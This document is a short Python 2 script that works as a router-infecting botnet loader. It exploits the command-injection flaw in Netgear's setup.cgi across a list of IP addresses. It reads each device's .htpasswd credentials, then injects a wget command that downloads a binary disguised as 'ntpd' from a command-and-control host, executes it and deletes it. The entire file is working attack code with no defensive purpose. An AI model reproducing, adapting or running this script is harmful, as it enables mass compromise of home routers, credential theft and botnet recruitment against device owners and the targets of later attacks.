# nano /usr/include/bits/typesizes.h -> change 1024 to 99999
# ulimit -n 1000000

import threading, random, socket, time, sys, urllib2

blacklisted = ["127.0","10.0","192.168"]
ports = [5000, 80, 8080, 8000, 8888, 8443]

if len(sys.argv) < 2:
    sys.exit("Usage: python " + sys.argv[0] + " <ip-list> <cnc-ip>")
print "Scanner starting..."

server_ip = sys.argv[2]

def infect(ip):
    global ports
    global blacklisted
    try:
        thisipisbad='no'
        for badip in blacklisted:
            if badip in ip:
                thisipisbad='yes'
        if thisipisbad=='yes':
            sys.exit()
        for port in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((ip, port))
                s.close()
                ppport = port
            except:
                pass
        
        dobreak=False
        if ppport != 8080:
            rs = urllib2.urlopen("http://" + ip + ":" + str(ppport) + "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat+/www/.htpasswd&curpath=/&currentsetting.htm=1")
        else:
            rs = urllib2.urlopen("http://" + ip + "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat+/www/.htpasswd&curpath=/&currentsetting.htm=1")
        time.sleep(1)
        
        if "admin:" in rs.read():
            badserver=False
        else:
            sys.exit()
        badserver=False		
        if badserver == False:
                print "Infecting " + ip
                if ppport != 8080:
                    url = "http://" + ip + ":" + str(ppport) + "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=wget%20http://" + server_ip + "/ntpd%20-O%20/var/tmp/ntpd;%20chmod%20777%20/var/tmp/ntpd;%20/var/tmp/ntpd;%20rm%20-rf%20/var/tmp/ntpd&curpath=/&currentsetting.htm=1"
                else:
                    url = "http://" + ip + "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=wget%20http://" + server_ip + "/ntpd%20-O%20/var/tmp/ntpd;%20chmod%20777%20/var/tmp/ntpd;%20/var/tmp/ntpd;%20rm%20-rf%20/var/tmp/ntpd&curpath=/&currentsetting.htm=1"
                rs = urllib2.urlopen(url, timeout=5)
                time.sleep(1)
    except Exception as e:
        pass

vulns = open(sys.argv[1], "r").readlines()
x = 0

for line in vulns:
    try:

        line = line.replace("\n", "")
        if x > 50:
            time.sleep(1)
            x = 0
       
        t = threading.Thread(target=infect, args=(line,))
        t.start()
        
	x += 1
    except Exception as e:
        pass

print "Done"
    
